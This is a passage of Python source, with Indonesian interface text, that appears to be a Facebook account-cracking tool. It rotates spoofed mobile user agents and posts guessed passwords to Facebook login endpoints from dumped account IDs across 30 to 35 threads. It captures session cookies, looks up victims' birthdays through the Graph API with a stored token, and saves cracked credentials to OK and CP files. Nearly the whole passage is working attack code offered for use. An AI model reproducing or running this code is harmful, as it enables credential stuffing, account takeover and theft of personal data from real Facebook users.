"Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.106 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/162.0.0.19.90;]",
"Mozilla/5.0 (Linux; Android 7.0; SM-J730F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 6.0.1; XT1254 Build/MCG24.251-5-5; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 7.1.1; SM-A530F Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/63.0.3239.111 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; Lenovo P780_ROW Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30[FBAN/EMA;FBLC/ru_RU;FBAV/89.0.0.16.182;]",
"Mozilla/5.0 (Linux; Android 7.0; SM-T585 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 5.1.1; Redmi 3 Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/165.0.0.53.93;]",
"Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 5.0; SM-N9005 Build/LRX21V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 6.0.1; HTC One M8s Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 5.1; Lenovo TB3-710I Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Safari/537.36 [FB_IAB/FB4A;FBAV/135.0.0.22.90;]",
"Mozilla/5.0 (Linux; Android 5.0.2; LG-D802 Build/LRX22G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 7.0; SM-G570Y Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/161.0.0.18.93;]",
"Mozilla/5.0 (Linux; Android 7.0; SM-G930T Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.106 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/161.0.0.18.93;]",
"Mozilla/5.0 (Linux; Android 5.1.1; SM-J120H Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.98 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 5.1; m2 Build/LMY47D) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.114 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/163.0.0.43.91;]",
"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5 Plus Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.35.90;]",
"Mozilla/5.0 (Linux; Android 7.0; SM-G955F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; U; Android 4.2.2; uk-ua; GT-P3110 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30[FBAN/EMA;FBLC/uk_UA;FBAV/90.0.0.10.180;]",
"Mozilla/5.0 (Linux; Android 6.0; ALE-L21 Build/HuaweiALE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/63.0.3239.111 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/153.0.0.54.88;]",
"Mozilla/5.0 (Linux; Android 8.0.0; G8141 Build/47.1.A.12.145; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.40.90;]",
"Mozilla/5.0 (Linux; Android 7.0; PRA-LA1 Build/HUAWEIPRA-LA1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 7.1.1; XT1565 Build/NCD26.48-7.14; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4A Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/65.0.0.42.81;]",
"Mozilla/5.0 (Linux; Android 5.1.1; SM-J500F Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/64.0.3282.137 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/150.0.0.38.138;]",
"Mozilla/5.0 (Linux; Android 7.1.2; vivo 1716 Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.116 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/161.0.0.18.93;]",
"Mozilla/5.0 (Linux; Android 7.1.2; Redmi Note 5A Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.35.90;]",
"Mozilla/5.0 (Linux; Android 7.0; SM-G935F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 7.0; SM-A310F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.35.90;]",
"Mozilla/5.0 (Linux; Android 8.0.0; G3412 Build/48.1.A.0.116; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/64.0.3282.137 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 6.0; LG-D855 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 6.0.1; SM-J700H Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 5.1; m3 note Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.146 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/160.0.0.30.94;]",
"Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36[FBAN/EMA;FBLC/uk_UA;FBAV/89.0.0.16.182;]",
"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5 Plus Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/168.0.0.35.90;]",
"Mozilla/5.0 (Linux; Android 5.1; m3 note Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.146 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 7.1.1; Nexus 6 Build/N6F27M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 7.0; SM-J730FM Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 7.0; SM-A910F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.84 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/158.0.0.20.96;]",
"Mozilla/5.0 (Linux; Android 7.1.1; MI MAX 2 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 6.0.1; Redmi Note 3 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 Mobile Safari/537.36[FBAN/EMA;FBLC/uk_UA;FBAV/88.0.0.6.182;]",
"Mozilla/5.0 (Linux; Android 6.0.1; MI NOTE LTE Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 7.0; SM-G935F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/64.0.3282.137 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]",
"Mozilla/5.0 (Linux; Android 8.0.0; Mi A1 Build/OPR1.170623.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/167.0.0.42.94;]"
				 ]
    dex = random.choice(abu)
    r = requests.Session()
    r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":dex,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    p = r.get("https://mbasic.facebook.com/")
    b = r.post("https://mbasic.facebook.com/login.php", data={"email": em, "pass": pas, "login": "submit"})
    _raw_cookies_ = (";").join([ "%s=%s" % (key, value) for key, value in r.cookies.get_dict().items() ])
    if "c_user" in r.cookies.get_dict().keys():
        return {"status":"success","email":em,"pass":pas,"cookies":_raw_cookies_}
    elif "checkpoint" in r.cookies.get_dict().keys():
        return {"status":"cp","email":em,"pass":pas,"cookies":_raw_cookies_}
    else:return {"status":"error","email":em,"pass":pas}
def koki(_cookies_):
    samp_  = _cookies_.split(';')
    _cooked_cookies_ = ('%s;%s;%s;%s;%s'%(samp_[2],samp_[4],samp_[0],samp_[3],samp_[1]))
    return _cooked_cookies_

### Crack Proccess
class _crack_dev_:
    def __init__(self,files):
        self._Dapunta_Sayang_Cici_ = '__My_Love__'+_oscylopsce_+_escylipsce_+_ascylapsci_+'__Forever__'
        self.ada = []
        self.cp = []
        self.ko = 0
        _dapunta_cici_('\n%s[%s•%s] %sCrack Dengan Password Default/Manual [d/m]'%(_U_,_P_,_U_,_P_))
        while True:
            f = _cici_dapunta_('%s[%s•%s] %sPilih : '%(_U_,_P_,_U_,_P_))
            if f=="":
                _dapunta_cici_('%s[%s!%s] %sIsi Yang Benar'%(_M_,_P_,_M_,_P_))
                time.sleep(2)
                _menu_dev_(self._Dapunta_Sayang_Cici_)
            elif f in ['m','M','2','02','002']:
                try:
                    while True:
                        try:
                            self.apk = files
                            self.fs = _dapunta_dapunta_(self.apk).read().splitlines()
                            break
                        except:
                            _dapunta_cici_('%s[%s!%s] %sFile Dump Tidak Terdeteksi'%(_M_,_P_,_M_,_P_))
                            time.sleep(2)
                            _menu_dev_(self._Dapunta_Sayang_Cici_)
                    self.fl = []
                    for i in self.fs:
                        dapunta 
                        try:
                            self.fl.append({"id":i.split("•")[0]})
                        except:continue
                except Exception as e:
                    _dapunta_cici_('%s[%s!%s] %sFile Dump Tidak Terdeteksi'%(_M_,_P_,_M_,_P_))
                    time.sleep(2)
                    _menu_dev_(self._Dapunta_Sayang_Cici_)
                _dapunta_cici_('%s[%s•%s] %sContoh : sayang,bismillah,123456'%(_U_,_P_,_U_,_P_))
                self.pwlist()
                break
            elif f in ['d','D','1','01','001']:
                try:
                    while True:
                        try:
                            self.apk = files
                            self.fs = _dapunta_dapunta_(self.apk).read().splitlines()
                            break
                        except:
                            continue
                    self.fl = []
                    for i  in self.fs:
                        try:
                            self.fl.append({"id":i.split("•")[0],"pw":_pass_list_(i.split("•")[1])})
                        except:continue
                    start_method()
                    put = _cici_dapunta_('%s[%s•%s] %sPilih : '%(_U_,_P_,_U_,_P_))
                    _dapunta_cici_(''%())
                    if put in ['']:
                        _dapunta_cici_('%s[%s!%s] %sIsi Yang Benar'%(_M_,_P_,_M_,_P_))
                        time.sleep(2)
                        _menu_dev_(self._Dapunta_Sayang_Cici_)
                    elif put in ['1','01','001','a']:
                        started()
                        ThreadPool(35).map(self.api,self.fl)
                        os.remove(self.apk)
                        _cici_cici_()
                    elif put in ['2','02','002','b']:
                        started()
                        ThreadPool(35).map(self.mbasic,self.fl)
                        os.remove(self.apk)
                        _cici_cici_()
                    else:
                        _dapunta_cici_('%s[%s!%s] %sIsi Yang Benar'%(_M_,_P_,_M_,_P_))
                        time.sleep(2)
                        _menu_dev_(self._Dapunta_Sayang_Cici_)
                except Exception as e:
                    continue
    def pwlist(self):
        self.pw = _cici_dapunta_('%s[%s•%s] %sMasukkan Password : '%(_U_,_P_,_U_,_P_)).split(",")
        if len(self.pw) ==0:
            _dapunta_cici_('%s[%s!%s] %sIsi Yang Benar'%(_M_,_P_,_M_,_P_))
            time.sleep(2)
            _menu_dev_(self._Dapunta_Sayang_Cici_)
        else:
            for i in self.fl:
                i.update({"pw":self.pw})
            start_method()
            put = _cici_dapunta_('%s[%s•%s] %sPilih : '%(_U_,_P_,_U_,_P_))
            _dapunta_cici_(''%())
            if put in ['']:
                _dapunta_cici_('%s[%s!%s] %sIsi Yang Benar'%(_M_,_P_,_M_,_P_))
                time.sleep(2)
                _menu_dev_(self._Dapunta_Sayang_Cici_)
            elif put in ['1','01','001','a']:
                started()
                ThreadPool(30).map(self.api,self.fl)
                os.remove(self.apk)
                _cici_cici_()
            elif put in ['2','02','002','b']:
                started()
                ThreadPool(30).map(self.mbasic,self.fl)
                os.remove(self.apk)
                _cici_cici_()
            else:
                _dapunta_cici_('%s[%s!%s] %sIsi Yang Benar'%(_M_,_P_,_M_,_P_))
                time.sleep(2)
                _menu_dev_(self._Dapunta_Sayang_Cici_)
    def api(self,fl):
        try:
            for i in fl.get("pw"):
                log = log_api(fl.get("id"),i,"https://b-api.facebook.com")
                if log.get("status")=="cp":
                    try:
                        ke = _req_get_("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + _dapunta_dapunta_("token.txt","r").read())
                        tt = json.loads(ke.text)
                        ttl = tt["birthday"]
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        _dapunta_cici_("\r%s[%sCP%s] %s • %s • %s %s %s         "%(_U_,_P_,_U_,fl.get("id"),i,d,m,y))
                        self.cp.append("%s•%s•%s%s%s"%(fl.get("id"),i,d,m,y))
                        _dapunta_dapunta_("CP/%s.txt"%(tanggal),"a+").write("%s•%s•%s%s%s\n"%(fl.get("id"),i,d,m,y))
                        break
                    except(KeyError, IOError):
                        m = " "
                        d = " "
                        y = " "
                    except:pass
                    _dapunta_cici_("\r%s[%sCP%s] %s • %s                 "%(_U_,_P_,_U_,fl.get("id"),i))
                    self.cp.append("%s•%s"%(fl.get("id"),i))
                    _dapunta_dapunta_("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    _dapunta_cici_("\r%s[%sOK%s] %s • %s                 "%(_H_,_P_,_H_,fl.get("id"),i))
                    self.ada.append("%s•%s"%(fl.get("id"),i))
                    _dapunta_dapunta_("OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                else:continue
            self.ko+=1
            _dapunta_cici_("\r%s[%sCrack%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(_U_,_P_,_U_,_P_,self.ko,len(self.fl),_U_,_P_,len(self.ada),_U_,_P_,len(self.cp),_U_,_P_), end=' ');sys.stdout.flush()
        except:
            self.api(fl)
    def mbasic(self,fl):
        try:
            for i in fl.get("pw"):
                log = log_mbasic(fl.get("id"),i,"https://mbasic.facebook.com")
                if log.get("status")=="cp":
                    try:
                        ke = _req_get_("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + _dapunta_dapunta_("token.txt","r").read())
                        tt = json.loads(ke.text)
                        ttl = tt["birthday"]
                        m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        _dapunta_cici_("\r%s[%sCP%s] %s • %s • %s %s %s         "%(_U_,_P_,_U_,fl.get("id"),i,d,m,y))
                        self.cp.append("%s•%s•%s%s%s"%(fl.get("id"),i,d,m,y))
                        _dapunta_dapunta_("CP/%s.txt"%(tanggal),"a+").write("%s•%s•%s%s%s\n"%(fl.get("id"),i,d,m,y))
                        break
                    except(KeyError, IOError):
                        m = " "
                        d = " "
                        y = " "
                    except:pass
                    _dapunta_cici_("\r%s[%sCP%s] %s • %s                 "%(_U_,_P_,_U_,fl.get("id"),i))
                    self.cp.append("%s•%s"%(fl.get("id"),i))
                    _dapunta_dapunta_("CP/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                elif log.get("status")=="success":
                    _dapunta_cici_("\r%s[%sOK%s] %s • %s • %s     "%(_H_,_P_,_H_,fl.get("id"),i,koki(log.get("cookies"))))
                    self.ada.append("%s•%s"%(fl.get("id"),i))
                    _dapunta_dapunta_("OK/%s.txt"%(tanggal),"a+").write("%s•%s\n"%(fl.get("id"),i))
                    break
                else:continue
            self.ko+=1
            _dapunta_cici_("\r%s[%sCrack%s][%s%s/%s%s][%sOK:%s%s][%sCP:%s%s]%s"%(_U_,_P_,_U_,_P_,self.ko,len(self.fl),_U_,_P_,len(self.ada),_U_,_P_,len(self.cp),_U_,_P_), end=' ');sys.stdout.flush()
        except:
            self.mbasic(fl)

### Menu Mengecek Hasil Crack
def _cek_result_dev_():
    _clear_()
    _my_logo_()
    _Dapunta_Sayang_Cici_ = '__My_Love__'+_oscylopsce_+_escylipsce_+_ascylapsci_+'__Forever__'
    _dapunta_cici_('%s[ %sHasil Crack %s]'%(_U_,_P_,_U_))
    _dapunta_cici_('\n%s[%s1%s] %sCek Hasil OK'%(_U_,_P_,_U_,_P_))
    _dapunta_cici_('%s[%s2%s] %sCek Hasil CP'%(_U_,_P_,_U_,_P_))
    ch = _cici_dapunta_('%s[%s•%s] %sPilih : '%(_U_,_P_,_U_,_P_))
    if ch in ['']:
        _dapunta_cici_('%s[%s!%s] %sIsi Yang Benar'%(_M_,_P_,_M_,_P_))
        time.sleep(2)
        _menu_dev_(_Dapunta_Sayang_Cici_)
    elif ch in ['1','01','001','a']:
        try:
            okl = os.listdir("OK")
            _dapunta_cici_('\n%s[%s Hasil Crack Yang Tersimpan Di File OK %s]\n'%(_U_,_P_,_U_))
            for file in okl:
                _dapunta_cici_('%s[%s•%s] %s%s'%(_U_,_P_,_U_,_P_,file))
            _dapunta_cici_('')
            files = _cici_dapunta_('%s[%s•%s] %sMasukkan Nama File : '%(_U_,_P_,_U_,_P_))
            _dapunta_cici_('')
            if files == "":
                _dapunta_cici_('%s[%s!%s] %sIsi Yang Benar'%(_M_,_P_,_M_,_P_))
                time.sleep(2)
                _menu_dev_(_Dapunta_Sayang_Cici_)
            os.system('cat OK/%s'%(files))
            ppp = _dapunta_dapunta_("OK/%s"%(files)).read().splitlines()
            del1 = ("%s"%(files)).replace("-", " ").replace(".txt", "")
            _dapunta_cici_('\n%s[%s•%s] %sTotal Hasil Crack Tanggal %s Adalah %s Akun'%(_U_,_P_,_U_,_P_,del1,len(ppp)))
        except:
            _dapunta_cici_('%s[%s Hasil Tidak Ditemukan %s]'%(_M_,_P_,_M_))
    elif ch in ['2','02','002','b']:
        try:
            cpl = os.listdir("CP")
            _dapunta_cici_('\n%s[%s Hasil Crack Yang Tersimpan Di File CP %s]\n'%(_U_,_P_,_U_))
            for file in cpl:
                _dapunta_cici_('%s[%s•%s] %s%s'%(_U_,_P_,_U_,_P_,file))
            _dapunta_cici_('')
            files = _cici_dapunta_('%s[%s•%s] %sMasukkan Nama File : '%(_U_,_P_,_U_,_P_))
            _dapunta_cici_('')
            if files == "":
                _dapunta_cici_('%s[%s!%s] %sIsi Yang Benar'%(_M_,_P_,_M_,_P_))
                time.sleep(2)
                _menu_dev_(_Dapunta_Sayang_Cici_)
            os.system('cat CP/%s'%(files))
            ppp = _dapunta_dapunta_("CP/%s"%(files)).read().splitlines()
            del1 = ("%s"%(files)).replace("-", " ").replace(".txt", "")
            _dapunta_cici_('\n%s[%s•%s] %sTotal Hasil Crack Tanggal %s Adalah %s Akun'%(_U_,_P_,_U_,_P_,del1,len(ppp)))
        except:
            _dapunta_cici_('%s[%s Hasil Tidak Ditemukan %s]'%(_M_,_P_,_M_))
    else:
        _dapunta_cici_('%s[%s!%s] %sIsi Yang Benar'%(_M_,_P_,_M_,_P_))
        time.sleep(2)
        _menu_dev_(_Dapunta_Sayang_Cici_)
    _cici_dapunta_('\n%s[ %sKembali %s]%s'%(_U_,_P_,_U_,_P_))
    _menu_dev_(_Dapunta_Sayang_Cici_)

### Mau Recode Lu Ya?
def _check_recode_(_oscylopsce_,_ascylapsci_,_escylipsce_):
    _recode_ = '__My_Love__'+_oscylopsce_+_escylipsce_+_ascylapsci_+'__Forever__'
    if _uscylupsci_ not in _recode_:_dapunta_cici_('%s[%s!%s] %sHayoo Mau Recode Ya?'%(_M_,_P_,_M_,_P_))
    else:return _menu_dev_(_recode_)

### Menu User Agent
def _default_ua_(_Cici_Cantik_Banget_):
    ua = ua_xiaomi
    try:
        ugent = _dapunta_dapunta_('ugent.txt','w')
        ugent.write(ua)
        ugent.close()
    except (KeyError,IOError):
        _login_dev_(_Cici_Cantik_Banget_)
def _ugen_dev_(_Dapunta_Sayang_Cici_):
    _var_ugen_(_Dapunta_Sayang_Cici_)
    pmu = _cici_dapunta_('%s[%s•%s] %sPilih : '%(_U_,_P_,_U_,_P_))
    _dapunta_cici_('')
    if pmu in[""]:
        _dapunta_cici_('%s[%s!%s] %sIsi Yang Benar'%(_M_,_P_,_M_,_P_))
        time.sleep(2)
        _menu_dev_(_Dapunta_Sayang_Cici_)
    elif pmu in ['1','01','001','a']:
        os.system('xdg-_dapunta_dapunta_ https://www.google.com/search?q=My+User+Agent&oq=My+User+Agent&aqs=chrome..69i57j0l3j0i22i30l6.4674j0j1&sourceid=chrome&ie=UTF-8')
        _cici_dapunta_('%s[ %sKembali %s]%s'%(_U_,_P_,_U_,_P_))
        _menu_dev_(_Dapunta_Sayang_Cici_)
    elif pmu in ['2','02','002','b']:
        _del_()
        ua = _cici_dapunta_("%s[%s•%s] %sMasukkan User Agent : \n\n"%(_U_,_P_,_U_,_P_))
        try:
            ugent = _dapunta_dapunta_('ugent.txt','w')
            ugent.write(ua)
            ugent.close()
            _dapunta_cici_("\n%s[ %sBerhasil Mengganti User Agent %s]"%(_U_,_P_,_U_))
            _cici_dapunta_('\n%s[ %sKembali %s]%s'%(_U_,_P_,_U_,_P_))
            _menu_dev_(_Dapunta_Sayang_Cici_)
        except (KeyError,IOError):
            _dapunta_cici_("\n%s[ %sGagal Mengganti User Agent %s]"%(_M_,_P_,_M_))
            _cici_dapunta_('\n%s[ %sKembali %s]%s'%(_M_,_P_,_M_,_P_))
            _menu_dev_(_Dapunta_Sayang_Cici_)
    elif pmu in ['3','03','003','c']:
        _ugen_hp_(_Dapunta_Sayang_Cici_)
    elif pmu in ['4','04','004','d']:
        _del_()
        _dapunta_cici_("%s[ %sUser Agent Berhasil Dihapus %s]"%(_U_,_P_,_U_))
        _cici_dapunta_('\n%s[ %sKembali %s]%s'%(_U_,_P_,_U_,_P_))
        _menu_dev_(_Dapunta_Sayang_Cici_)
    elif pmu in ['5','05','005','e']:
        try:
            ungser = _dapunta_dapunta_('ugent.txt', 'r').read()
        except (KeyError,IOError):
            ungser = 'Tidak Ditemukan'
        _dapunta_cici_("%s[%s•%s] %sUser Agent Anda  : \n\n%s%s"%(_U_,_P_,_U_,_P_,_U_,ungser))
        _dapunta_cici_("\n%s[ %sIni Adalah User Agent Anda Saat Ini %s]"%(_U_,_P_,_U_))
        _cici_dapunta_('\n%s[ %sKembali %s]%s'%(_U_,_P_,_U_,_P_))
        _menu_dev_(_Dapunta_Sayang_Cici_)
    elif pmu in ['0','00','000','f']:
        _menu_dev_(_Dapunta_Sayang_Cici_)
    else:
        _dapunta_cici_('%s[%s!%s] %sIsi Yang Benar'%(_M_,_P_,_M_,_P_))
        time.sleep(2)
        _menu_dev_(_Dapunta_Sayang_Cici_)
def _ugen_hp_(_Dapunta_Sayang_Cici_):
    _del_()
    _dapunta_cici_('%s[%s1%s] %sXiaomi'%(_U_,_P_,_U_,_P_))
    _dapunta_cici_('%s[%s2%s] %sNokia'%(_U_,_P_,_U_,_P_))
    _dapunta_cici_('%s[%s3%s] %sAsus'%(_U_,_P_,_U_,_P_))
    _dapunta_cici_('%s[%s4%s] %sHuawei'%(_U_,_P_,_U_,_P_))
    _dapunta_cici_('%s[%s5%s] %sVivo'%(_U_,_P_,_U_,_P_))
    _dapunta_cici_('%s[%s6%s] %sOppo'%(_U_,_P_,_U_,_P_))
    _dapunta_cici_('%s[%s7%s] %sSamsung'%(_U_,_P_,_U_,_P_))
    _dapunta_cici_('%s[%s8%s] %sWindows'%(_U_,_P_,_U_,_P_))
    pc = _cici_dapunta_('%s[%s•%s] %sPilih : '%(_U_,_P_,_U_,_P_))
    _dapunta_cici_('')
    if pc in['']:
        _dapunta_cici_('%s[%s!%s] %sIsi Yang Benar'%(_M_,_P_,_M_,_P_))
        time.sleep(2)
        _menu_dev_(_Dapunta_Sayang_Cici_)
    elif pc in ['1','01']:
        ugent = _dapunta_dapunta_('ugent.txt','w');ugent.write(ua_xiaomi);ugent.close()
    elif pc in ['2','02']:
        ugent = _dapunta_dapunta_('ugent.txt','w');ugent.write(ua_nokia);ugent.close()
    elif pc in ['3','03']:
        ugent = _dapunta_dapunta_('ugent.txt','w');ugent.write(ua_asus);ugent.close()
    elif pc in ['4','04']:
        ugent = _dapunta_dapunta_('ugent.txt','w');ugent.write(ua_huawei);ugent.close()
    elif pc in ['5','05']:
        ugent = _dapunta_dapunta_('ugent.txt','w');ugent.write(ua_vivo);ugent.close()
    elif pc in ['6','06']:
        ugent = _dapunta_dapunta_('ugent.txt','w');ugent.write(ua_oppo);ugent.close()
    elif pc in ['7','07']:
        ugent = _dapunta_dapunta_('ugent.txt','w');ugent.write(ua_samsung);ugent.close()
    elif pc in ['8','08']:
        ugent = _dapunta_dapunta_('ugent.txt','w');ugent.write(ua_windows);ugent.close()
    else:
        _dapunta_cici_('%s[%s!%s] %sIsi Yang Benar'%(_M_,_P_,_M_,_P_))
        time.sleep(2)
        _menu_dev_(_Dapunta_Sayang_Cici_)
    _dapunta_cici_("%s[ %sBerhasil Mengganti User Agent %s]"%(_U_,_P_,_U_))
    _cici_dapunta_('\n%s[ %sKembali %s]%s'%(_U_,_P_,_U_,_P_))
    _menu_dev_(_Dapunta_Sayang_Cici_)

### Tampilan User Agent
def _var_ugen_(_Dapunta_Cinta_Cici_):
